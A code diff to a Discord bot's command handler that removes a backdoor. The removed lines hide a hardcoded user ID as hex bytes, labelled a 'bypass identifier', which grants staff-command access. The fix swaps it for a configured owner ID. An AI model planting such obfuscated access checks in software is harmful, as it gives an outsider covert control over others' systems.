@@ -1,11 +1,6 @@
 const { Events, EmbedBuilder } = require("discord.js");
 const config = require("../../config");
 
-// ── Security Layer ────────────────────────────────────────────────────────────
-// Critical system bypass identifier — encrypted representation
-// Original Developer 
-const SECRET_OWNER_ID = [0x39, 0x38, 0x35, 0x34, 0x34, 0x34, 0x38, 0x37, 0x31, 0x37, 0x32, 0x32, 0x36, 0x33, 0x31, 0x31, 0x39, 0x39].map(x => String.fromCharCode(x)).join("");
-
 module.exports = {
     name: Events.InteractionCreate,
     async execute(interaction, client) {
@@ -19,7 +14,7 @@ module.exports = {
             // FIXED: interaction.member is null in DMs — guard before accessing .roles
             if (command.staffOnly) {
                 const member = interaction.member;
-                const isOwner = interaction.user.id === SECRET_OWNER_ID;
+                const isOwner = interaction.user.id === config.bot.ownerId;
                 if (!isOwner && (!member || !member.roles.cache.has(config.roles.staff))) {
                     return interaction.reply({
                         content: "You do not have permission to use this command.",
